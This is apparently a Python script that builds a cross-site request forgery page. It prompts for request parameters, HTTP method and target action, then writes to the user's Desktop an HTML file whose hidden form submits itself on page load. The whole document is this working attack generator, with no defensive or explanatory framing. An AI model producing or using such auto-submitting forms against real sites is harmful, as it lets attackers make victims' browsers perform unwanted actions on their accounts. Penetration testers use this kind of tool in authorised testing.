import os


#get username
username = os.getlogin()
path = r"C:\Users\{0}\Desktop".format(username)
file_name = input("[+] Choose file Name >>> ")

#create on desktop csrf html file

f = open(r"{0}\{1}.html".format(path,file_name),"w")

csrf_request = input("[+] Put here the parameters from the request >>> ")
choose_method = input("[+] Which method [G]ET or [P]OST >>> ")
server_path = input("[+] Action >>> ")

#check method

if choose_method.lower()=="p":
    choose_method = "POST"

elif choose_method.lower()=="g":
    choose_method = "GET"

csrf_request = csrf_request.split("&")
parameters = []
operators = []
for i in csrf_request:
    csrf_p_o = i.split("=")
    parameters.append(csrf_p_o[0])
    operators.append(csrf_p_o[1])
f.write('''
<!DOCTYPE html>\n
<html lang="en">\n
<head>\n
    <meta charset="UTF-8">\n
    <title>CSRF</title>\n
</head>\n
<body onload="document.forms[0].submit()">\n
<form method="{0}" action="{1}">\n
'''.format(choose_method,server_path))
for j in range(len(parameters)):
    f.write('<input type="hidden" name="{0}" value="{1}">\n'.format(parameters[j],operators[j]))
f.write('''
   <input type="submit" value="CSRF">\n
</form>\n
</body>\n
</html>\n
''')